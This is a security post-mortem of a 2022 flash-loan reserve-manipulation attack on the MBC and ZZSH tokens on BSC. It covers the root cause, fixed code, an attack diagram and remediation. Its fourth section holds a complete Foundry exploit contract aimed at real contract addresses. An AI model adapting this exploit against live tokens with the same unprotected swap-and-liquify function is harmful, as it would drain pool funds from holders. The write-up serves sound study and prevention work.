# MBC/ZZSH — swapAndLiquifyStepv1() Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | MBC Token / ZZSH Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **MBC Token** | [0x4E87880A72f6896E7e0a635A5838fFc89b13bd17](https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17) |
| **ZZSH Token** | [0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6](https://bscscan.com/address/0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6) |
| **MBC Pair** | [0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1](https://bscscan.com/address/0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) |
| **ZZSH Pair** | [0x33CCA0E0CFf617a2aef1397113E779E42a06a74A](https://bscscan.com/address/0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A](https://bscscan.com/address/0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **ETH (BSC)** | [0x2170Ed0880ac9A755fd29B2688956BD959F933F8](https://bscscan.com/address/0x2170Ed0880ac9A755fd29B2688956BD959F933F8) |
| **Root Cause** | `swapAndLiquifyStepv1()` is callable by anyone without access control and uses `amountOutMin=0` for internal swaps, forcing execution even under manipulated reserve conditions (missing access control + slippage protection) |
| **CWE** | CWE-840: Business Logic Errors |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/MBC_ZZSH_exp.sol) |

---
## 1. Vulnerability Overview

The MBC and ZZSH token contracts each contained a `swapAndLiquifyStepv1()` function that automatically adds tokens accumulated from transaction fees into liquidity. This function was directly callable from external accounts and executed swaps based on the current reserve ratio of the AMM pair. The attacker flash-borrowed the entire USDT pool from DODO and manipulated the pair reserves via a large USDT→MBC swap. By triggering `swapAndLiquifyStepv1()` in this state, the contract converted its held MBC to USDT at a distorted ratio, allowing the attacker to profit by reverse-swapping. The same attack was then repeated against ZZSH.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable swapAndLiquifyStepv1() - externally triggerable + susceptible to reserve manipulation
contract MBCToken {
    uint256 private _liquidityFee = 5; // 5% liquidity fee
    uint256 private _tokenBalance; // accumulated fee tokens

    // ❌ Callable by anyone - triggering after AMM reserve manipulation executes a distorted swap
    function swapAndLiquifyStepv1() public {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance < minTokensBeforeSwap) return;

        // Swap half of the contract's held tokens for USDT
        uint256 half = contractBalance / 2;

        // ❌ AMM spot price-based swap - executes at an unfavorable ratio under manipulated reserves
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        // No minimum output validation → swap executes at any price
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            half, 0, path, address(this), block.timestamp
        );

        // Add liquidity with remaining half + received USDT
        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
        router.addLiquidity(address(this), USDT, half, usdtBalance, 0, 0, owner, block.timestamp);
    }
}

// ✅ Correct pattern - access control + minimum output validation
contract SafeMBCToken {
    function swapAndLiquifyStepv1() public onlyOwnerOrKeeper {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance < minTokensBeforeSwap) return;

        uint256 half = contractBalance / 2;
        // ✅ Defend against reserve manipulation via TWAP or minimum output validation
        uint256 expectedUsdt = _getExpectedOut(half);
        uint256 minUsdt = expectedUsdt * 95 / 100; // Allow 5% slippage

        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = USDT;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            half, minUsdt, path, address(this), block.timestamp
        );
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**MBC_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `swapAndLiquifyStepv1()` is callable by anyone without access control and uses `amountOutMin=0` for internal swaps, forcing execution even under manipulated reserve conditions
    function swapAndLiquifyStepv1() external {}  // 0xad594920  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan entire USDT pool from DODO (large amount)
    │
    ├─[2] MBC attack phase:
    │       ├─ Swap 150,000 USDT → MBC
    │       │   Manipulate MBC/USDT pair reserves
    │       │   MBC price (USDT/MBC) spikes sharply
    │       │
    │       ├─ Trigger swapAndLiquifyStepv1()
    │       │   ❌ No access control
    │       │   Contract's held MBC → converted to USDT at manipulated ratio (large MBC drain)
    │       │
    │       └─ Reverse swap MBC → USDT (attacker sells held MBC)
    │
    ├─[3] ZZSH attack phase: repeat same pattern
    │
    ├─[4] Repay DODO flash loan
    │
    └─[5] Net profit: USDT arbitrage (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IMBC {
    // ❌ Swap+liquidity function with no access control
    function swapAndLiquifyStepv1() external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IZZSH {
    function swapAndLiquifyStepv1() external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MBCZZSHExploit is Test {
    IDODO  dodo   = IDODO(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IMBC   mbc    = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    IZZSH  zzsh   = IZZSH(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 23_474_460);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        dodo.flashLoan(USDT.balanceOf(address(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A)), 0, address(this), "");
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] MBC attack
        USDT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(mbc);

        // 150,000 USDT → MBC (reserve manipulation)
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            150_000 * 1e18, 0, path, address(this), block.timestamp
        );

        // ⚡ Trigger swapAndLiquifyStepv1() - unfavorable swap under manipulated reserves
        mbc.swapAndLiquifyStepv1();

        // Reverse swap MBC → USDT
        path[0] = address(mbc); path[1] = address(USDT);
        mbc.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mbc.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 3] ZZSH attack (same pattern)
        path[0] = address(USDT); path[1] = address(zzsh);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            150_000 * 1e18, 0, path, address(this), block.timestamp
        );
        zzsh.swapAndLiquifyStepv1();
        path[0] = address(zzsh); path[1] = address(USDT);
        zzsh.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            zzsh.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 4] Repay DODO flash loan
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Externally callable auto-liquidity function + AMM spot price dependency |
| **CWE** | CWE-840: Business Logic Errors |
| **OWASP DeFi** | Flash loan + price manipulation |
| **Attack Vector** | DODO flash loan → large USDT→MBC swap → trigger `swapAndLiquifyStepv1()` → reverse swap |
| **Preconditions** | `swapAndLiquifyStepv1()` externally callable, no minimum output validation |
| **Impact** | USDT arbitrage profit (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Add Access Control**: Change `swapAndLiquifyStepv1()` to `private` or `onlyOwner` to prevent arbitrary external triggering.
2. **Minimum Output Validation**: Set a minimum output amount relative to TWAP or expected price during swaps to block unfavorable swaps under manipulated reserves.
3. **Fee-on-Transfer Token Caution**: Auto-liquidity addition mechanisms can cause unexpected reserve discrepancies with fee-on-transfer tokens, requiring additional slippage validation.

---
## 7. Lessons Learned

- **Public Exposure of Auto-Liquidity Functions**: The `swapAndLiquify()` pattern is commonly used in many BSC tokens such as SafeMoon. When this function is externally triggerable, it becomes a target for reserve manipulation attacks using flash loans.
- **Chained Application of the Same Attack**: The identical attack was executed against both MBC and ZZSH consecutively within a single transaction. Tokens sharing similar code patterns share the same vulnerability, meaning a single discovery can lead to simultaneous attacks across multiple protocols.
- **Importance of Minimum Output (Slippage) Protection**: Swaps configured with `amountOutMin = 0` will execute at any price. Protocol-internal swaps must always set a reasonable minimum output value.